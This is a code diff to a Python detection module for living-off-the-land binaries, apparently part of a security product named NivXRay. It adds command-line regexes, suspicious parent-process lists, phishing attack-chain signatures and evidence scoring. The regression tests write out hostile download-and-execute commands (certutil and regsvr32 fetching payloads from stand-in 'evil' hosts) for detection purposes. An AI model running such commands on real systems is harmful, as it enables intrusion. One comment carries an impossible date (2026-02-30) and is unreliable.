@@ -198,6 +198,163 @@ _KIND_ARG         = "lolbin.argument"
 _KIND_CATEGORY    = "lolbin.capability"
 _KIND_MITRE       = "attack.technique"
 _KIND_PARENT      = "lolbin.parent_child"
+_KIND_CHAIN       = "lolbin.attack_chain"   # grandparent → parent → child
+_KIND_CLI_HEUR    = "lolbin.cli_heuristic"  # userwritable path / encoded / http
+
+# Command-line heuristics — deterministic regex primitives that flag
+# high-signal analyst signals independent of the specific LOLBIN.
+_CLI_HEURISTICS = {
+    "userwritable_path": re.compile(
+        r"(?:c:\\)?(?:users\\public|windows\\temp|\\temp\\|appdata|"
+        r"programdata|users\\[^\\]+\\appdata)\\",
+        re.IGNORECASE),
+    "http_argument": re.compile(r"https?://", re.IGNORECASE),
+    "encoded_command": re.compile(
+        r"(?:^|\s)-(?:enc|e|encodedcommand)(?:\s|=|$)|/e:|"
+        r"frombase64string",
+        re.IGNORECASE),
+    "hidden_window": re.compile(
+        r"-(?:w|windowstyle)\s+hidden|-nop\b|-noni\b|-nologo\b",
+        re.IGNORECASE),
+    "dll_load_export": re.compile(
+        r"[a-z0-9_]+\.dll[,\s]+[a-z_][a-z0-9_]*",
+        re.IGNORECASE),
+}
+
+# ── Universal parent tradecraft (applies to any Windows LOLBIN) ──
+# These lists apply as DEFAULTS to every executable LOLBAS entry that
+# is not covered by the high-signal curated registry above.  This gives
+# NivXRay 100 % LOLBIN parent-child coverage instead of the previous
+# hand-curated 15 keys.
+_NORMAL_PARENTS_UNIVERSAL = [
+    "explorer.exe", "svchost.exe", "services.exe", "wininit.exe",
+    "userinit.exe", "taskeng.exe", "taskhostw.exe", "wsmprovhost.exe",
+    "cmd.exe", "powershell.exe",
+]
+_SUSPICIOUS_PARENTS_UNIVERSAL = [
+    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
+    "onenote.exe", "acrord32.exe", "acrobat.exe", "wordpad.exe",
+    "teams.exe", "chrome.exe", "msedge.exe", "firefox.exe",
+    "iexplore.exe",
+]
+_ABNORMAL_PARENTS_UNIVERSAL = [
+    "mshta.exe", "regsvr32.exe", "rundll32.exe", "wscript.exe",
+    "cscript.exe", "certutil.exe", "hh.exe", "installutil.exe",
+    "msbuild.exe", "bitsadmin.exe", "wmic.exe", "schtasks.exe",
+    "control.exe", "cmstp.exe", "atbroker.exe", "cdb.exe",
+    "forfiles.exe", "pcalua.exe", "presentationhost.exe",
+]
+
+
+def _derive_universal_tiers(entry: dict) -> dict[str, list[str]]:
+    """Compute normal/suspicious/abnormal parents for any executable
+    LOLBAS entry.  Curated registry always takes precedence for the
+    high-signal LOLBINs; this fills the gap for the remaining ~227."""
+    name = entry["name"].lower()
+    if name in _PARENT_CHILD_TIERS:
+        return _PARENT_CHILD_TIERS[name]
+    # Only emit parent-child for executable-bearing entries.
+    paths = entry.get("paths") or []
+    if not any(str(p).lower().endswith((".exe", ".dll", ".msi",
+                                                                ".scr", ".cpl"))
+                    for p in paths):
+        return {}
+    return {
+        "normal":     list(_NORMAL_PARENTS_UNIVERSAL),
+        "suspicious": list(_SUSPICIOUS_PARENTS_UNIVERSAL),
+        "abnormal":   [p for p in _ABNORMAL_PARENTS_UNIVERSAL if p != name],
+    }
+
+
+# ── Observation semantics ────────────────────────────────────────
+# CRITICAL PRINCIPLE (per user directive · 2026-02-30):
+#   "Living-off-the-land binary is a CAPABILITY, not a verdict."
+# Every primitive hit carries `observation_type` + `signal_strength`
+# so the Correlation/Verdict engine — never NivXRay's detection layer —
+# can decide significance from the full evidence set.
+_OBSERVATION_META = {
+    _KIND_PATH: {
+        "observation_type": "LOLBIN",
+        "signal_strength": "OBSERVED",
+        "note": "living-off-the-land binary is a CAPABILITY, not a verdict",
+    },
+    _KIND_CMDLINE:  {"observation_type": "PATTERN",
+                                    "signal_strength": "WEAK"},
+    _KIND_ARG:      {"observation_type": "PATTERN",
+                                    "signal_strength": "WEAK"},
+    _KIND_CATEGORY: {"observation_type": "LOLBIN_CAPABILITY",
+                                     "signal_strength": "INFORMATIONAL"},
+    _KIND_MITRE:    {"observation_type": "ATTACK_TECHNIQUE",
+                                    "signal_strength": "INFORMATIONAL"},
+    _KIND_PARENT:   {"observation_type": "PARENT_CHILD"},
+    _KIND_CHAIN: {
+        "observation_type": "SEQUENCE",
+        "signal_strength": "STRONG",
+        "note": "named tradecraft chain — still EVIDENCE, correlation decides verdict",
+    },
+    _KIND_CLI_HEUR: {"observation_type": "PATTERN"},
+}
+# Parent-child tier → signal strength.  ABNORMAL is the *strongest*
+# single parent-child signal we emit but it is still MODERATE evidence,
+# never a verdict.
+_PARENT_CHILD_STRENGTH = {
+    "normal":     "INFORMATIONAL",
+    "suspicious": "WEAK",
+    "abnormal":   "MODERATE",
+    "unknown":    "INFORMATIONAL",
+}
+
+
+def _annotate_hit(hit: dict) -> dict:
+    """Attach `observation_type`, `signal_strength`, and (where
+    appropriate) the capability-not-verdict note."""
+    meta = dict(_OBSERVATION_META.get(hit["kind"], {}))
+    if hit["kind"] == _KIND_PARENT:
+        meta["signal_strength"] = _PARENT_CHILD_STRENGTH.get(
+            (hit.get("tier") or "unknown").lower(), "INFORMATIONAL")
+    if hit["kind"] == _KIND_CLI_HEUR:
+        # CLI heuristics: user-writable path / encoded / http contribute
+        # WEAK evidence each — meaningful only in combination.
+        meta["signal_strength"] = "WEAK"
+    hit.update(meta)
+    return hit
+
+
+
+# Every hop is lower-case basename.  The match engine surfaces the
+# chain label when a matching (grandparent -> parent -> child) tuple
+# is presented.  Chains never emit a verdict — they emit evidence
+# with `tier=abnormal` so the correlation engine can orchestrate.
+_ATTACK_CHAINS: list[dict] = [
+    {"label": "phishing.office.regsvr32.remote_scriptlet",
+      "chain": ["outlook.exe", "winword.exe", "regsvr32.exe"],
+      "mitre": "T1218.010",
+      "description": "Phishing → Office macro → regsvr32 remote scriptlet (Squiblydoo)."},
+    {"label": "phishing.office.rundll32.dll_load",
+      "chain": ["outlook.exe", "winword.exe", "rundll32.exe"],
+      "mitre": "T1218.011",
+      "description": "Phishing → Office macro → rundll32 malicious DLL load."},
+    {"label": "phishing.office.powershell.encoded",
+      "chain": ["outlook.exe", "winword.exe", "powershell.exe"],
+      "mitre": "T1059.001",
+      "description": "Phishing → Office macro → PowerShell encoded command."},
+    {"label": "phishing.office.mshta.remote_hta",
+      "chain": ["outlook.exe", "winword.exe", "mshta.exe"],
+      "mitre": "T1218.005",
+      "description": "Phishing → Office macro → mshta remote HTA."},
+    {"label": "phishing.excel.powershell",
+      "chain": ["outlook.exe", "excel.exe", "powershell.exe"],
+      "mitre": "T1059.001",
+      "description": "Phishing → Excel macro → PowerShell."},
+    {"label": "phishing.excel.cmd",
+      "chain": ["outlook.exe", "excel.exe", "cmd.exe"],
+      "mitre": "T1059.003",
+      "description": "Phishing → Excel macro → cmd.exe."},
+    {"label": "office.wscript.scripthost",
+      "chain": ["winword.exe", "wscript.exe"],  # 2-hop still tracked
+      "mitre": "T1059.005",
+      "description": "Office → wscript (VBS/JS execution)."},
+]
 
 # ── Parent-Child Registry ────────────────────────────────────────
 # Curated tiered relations per LOLBIN.  Never fabricated — every entry
@@ -373,13 +530,11 @@ def _generate_primitives(entry: dict) -> list[dict]:
         if mid and _MITRE_RE.match(mid):
             emit(_KIND_MITRE, mid)
 
-    # Parent-child primitives (three trust tiers) — only if the LOLBIN
-    # name appears in the curated registry.  Missing keys are handled
-    # by `_emit_global_parent_child_primitives()` after indexing so
-    # LOLBINs that upstream does not carry (e.g. powershell.exe) still
-    # produce parent-child coverage.
+    # Parent-child primitives (three trust tiers) — universal
+    # coverage: every executable LOLBAS entry participates, curated
+    # registry overrides for the 15 highest-signal LOLBINs.
     key = name.lower()
-    tiers = _PARENT_CHILD_TIERS.get(key)
+    tiers = _derive_universal_tiers(entry)
     if tiers:
         for tier in ("normal", "suspicious", "abnormal"):
             for parent in tiers.get(tier, []) or []:
@@ -444,23 +599,38 @@ _REGRESSION_CASES: list[tuple[str, dict]] = [
         "image": "certutil.exe",
         "command_line": "certutil -urlcache -split -f http://evil.example/x.exe",
     }),
-    ("office-spawns-powershell", {
-        "image": "powershell.exe", "parent_image": "winword.exe",
-        "command_line": "powershell -enc BASE64",
+    ("phishing-chain-outlook-word-regsvr32", {
+        "image": "regsvr32.exe",
+        "parent_image": "winword.exe",
+        "grandparent_image": "outlook.exe",
+        "command_line": "regsvr32.exe /s /u /i:http://evil/x.sct scrobj.dll",
+    }),
+    ("userwritable-dll-rundll32", {
+        "image": "rundll32.exe",
+        "command_line": "rundll32.exe C:\\Users\\Public\\update.dll,Start",
     }),
 ]
 
 
 def _run_regression(tenant_id: str = "regression") -> dict:
+    """Regression gate.  Each case must return >=1 UPSTREAM-BACKED hit
+    (`lolbin.image` or `lolbin.argument` — i.e., primitives derived
+    from actual LOLBAS entries).  Synthetic chain / cli-heuristic
+    matches DO NOT satisfy the gate — otherwise a 1-entry pack could
+    falsely reach COMPLETE."""
+    upstream_kinds = {_KIND_PATH, _KIND_ARG}
     passed, failed = 0, []
     for label, ev in _REGRESSION_CASES:
         try:
             hits = _match_event(tenant_id, ev)
-            if hits and len(hits) >= 1:
+            upstream_hits = [h for h in hits if h["kind"] in upstream_kinds]
+            if upstream_hits:
                 passed += 1
             else:
-                failed.append({"case": label, "reason": "no-primitives-matched"})
-        except Exception as exc:  # noqa: BLE001 · self-test wrapper: any failure counts as a case failure
+                failed.append({"case": label,
+                                        "reason": "no-upstream-backed-primitives-matched",
+                                        "synthetic_hits": len(hits)})
+        except Exception as exc:  # noqa: BLE001 · self-test wrapper
             failed.append({"case": label, "reason": f"error:{exc}"})
     return {"total": len(_REGRESSION_CASES), "passed": passed,
                  "failed": failed}
@@ -471,6 +641,7 @@ class MatchBody(BaseModel):
     image: str | None = None
     command_line: str | None = None
     parent_image: str | None = None
+    grandparent_image: str | None = None
     child_image: str | None = None
 
 
@@ -513,6 +684,7 @@ def _match_event(tenant_id: str, ev: dict) -> list[dict]:
 
     # Parent-child match (image + parent_image observed together).
     parent = (ev.get("parent_image") or "").lower()
+    grand  = (ev.get("grandparent_image") or "").lower()
     if image and parent:
         img_base = image.rsplit("\\", 1)[-1]
         par_base = parent.rsplit("\\", 1)[-1]
@@ -528,12 +700,42 @@ def _match_event(tenant_id: str, ev: dict) -> list[dict]:
                                     "tier": p.get("tier"),
                                     "parent": p.get("parent"),
                                     "child":  p.get("child")})
-    # De-duplicate hits by (kind, value, entry_name).
+
+    # Multi-hop attack chain (grandparent → parent → child).  A chain
+    # match ALWAYS carries tier=abnormal — that is the whole point of
+    # named tradecraft chains.
+    if image and parent and grand:
+        img_base = image.rsplit("\\", 1)[-1].lower()
+        par_base = parent.rsplit("\\", 1)[-1].lower()
+        gr_base  = grand.rsplit("\\", 1)[-1].lower()
+        chain_key = f"{gr_base}->{par_base}->{img_base}"
+        cur = _primitives().find(
+            {"kind": _KIND_CHAIN, "value_lc": chain_key},
+        )
+        for p in cur:
+            hits.append({"kind": p["kind"], "value": p["value"],
+                                "entry_name": p["entry_name"],
+                                "evidence": "attack-chain-match",
+                                "tier": "abnormal",
+                                "chain_label": p.get("chain_label"),
+                                "mitre": p.get("mitre"),
+                                "description": p.get("description")})
+
+    # Command-line heuristics — deterministic regex signals.
+    if cmdl:
+        for hkind, rx in _CLI_HEURISTICS.items():
+            if rx.search(cmdl):
+                hits.append({"kind": _KIND_CLI_HEUR, "value": hkind,
+                                    "entry_name": image or "cmdline",
+                                    "evidence": "cli-heuristic-match",
+                                    "heuristic": hkind})
+    # De-duplicate hits by (kind, value, entry_name) and annotate with
+    # observation semantics so every hit is understandable as evidence.
     seen, unique = set(), []
     for h in hits:
         k = (h["kind"], h["value"].lower(), h["entry_name"])
         if k not in seen:
-            seen.add(k); unique.append(h)
+            seen.add(k); unique.append(_annotate_hit(h))
     return unique
 
 
@@ -681,6 +883,22 @@ def _sync_pipeline(url: str, principal: tuple[str, str, str]) -> dict:
         p["indexed_at"] = now
     total_prims += len(extra)
     all_prims.extend(extra)
+    # Emit multi-hop attack-chain primitives.
+    for ch in _ATTACK_CHAINS:
+        hops = [h.lower() for h in ch["chain"]]
+        if len(hops) < 2:
+            continue
+        value    = "->".join(hops)
+        all_prims.append({
+            "id":           f"pri_{uuid.uuid4().hex[:20]}",
+            "entry_name":   hops[-1],   # child
+            "kind":         _KIND_CHAIN,
+            "value":        value, "value_lc": value,
+            "chain_label":  ch["label"], "mitre": ch.get("mitre"),
+            "description":  ch.get("description"),
+            "hops":         hops, "indexed_at": now, "synthetic": True,
+        })
+        total_prims += 1
     if all_prims:
         _primitives().insert_many(all_prims)
         try:
@@ -992,12 +1210,37 @@ def coverage(request: Request):
 
 @router.post("/match")
 def match(body: MatchBody, request: Request):
-    """Deterministic evidence-only matcher.  Never returns a verdict."""
+    """Deterministic evidence-only matcher.  Never returns a verdict.
+
+    Contract:
+        LOLBIN identity is a CAPABILITY, not a verdict.
+        parent-child SUSPICIOUS/ABNORMAL is evidence, not a verdict.
+        attack-chain matches are evidence, not verdicts.
+        Only the Correlation + Verdict engines determine final outcome.
+    """
     if _primitives() is None:
         raise HTTPException(status_code=503, detail="storage unavailable")
     ten, _, _ = _principal(request)
     hits = _match_event(ten, body.model_dump(exclude_none=True))
-    return {"ok": True, "data": {"hits": hits, "count": len(hits),
-                                                    "note": "primitives contribute EVIDENCE, "
-                                                                "not a verdict.  The correlation engine "
-                                                                "decides the outcome."}}
+    # Deterministic aggregate signal — helpful debug for analysts, still
+    # NOT a verdict.  The correlation engine reads `hits[*]` directly.
+    strength_score = {"OBSERVED": 0, "INFORMATIONAL": 0,
+                                  "WEAK": 1, "MODERATE": 3, "STRONG": 5}
+    aggregate = sum(strength_score.get(h.get("signal_strength", ""), 0)
+                              for h in hits)
+    disposition = "OBSERVED"
+    if aggregate >= 12:  disposition = "CORRELATION_CANDIDATE"
+    elif aggregate >= 6: disposition = "CONTEXTUALIZED"
+    elif aggregate >= 2: disposition = "OBSERVED_WITH_SIGNAL"
+    return {"ok": True, "data": {
+        "hits": hits, "count": len(hits),
+        "aggregate_signal_score": aggregate,
+        "disposition": disposition,
+        "contract": {
+            "principle": "Living-off-the-land binary is a CAPABILITY, not a verdict.",
+            "note": ("Every hit is EVIDENCE.  Only the correlation + "
+                          "verdict engines produce a verdict — NivXRay never "
+                          "escalates a LOLBIN identity or a single parent-child "
+                          "tier to MALICIOUS by itself."),
+        },
+    }}
